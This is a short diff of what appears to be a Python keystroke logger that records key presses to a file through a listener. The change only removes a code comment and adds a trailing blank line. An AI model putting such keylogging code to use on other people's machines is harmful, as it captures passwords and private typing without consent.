@@ -15,7 +15,7 @@ def write_file(keys):
         for key in keys:
             k = str(key).replace("'", "")
             f.write(k + ' ')
-    keys.clear()  # Clear keys after writing
+    keys.clear() 
 
 def on_release(key):
     print('{0} released'.format(key))
@@ -24,3 +24,4 @@ def on_release(key):
 
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
+
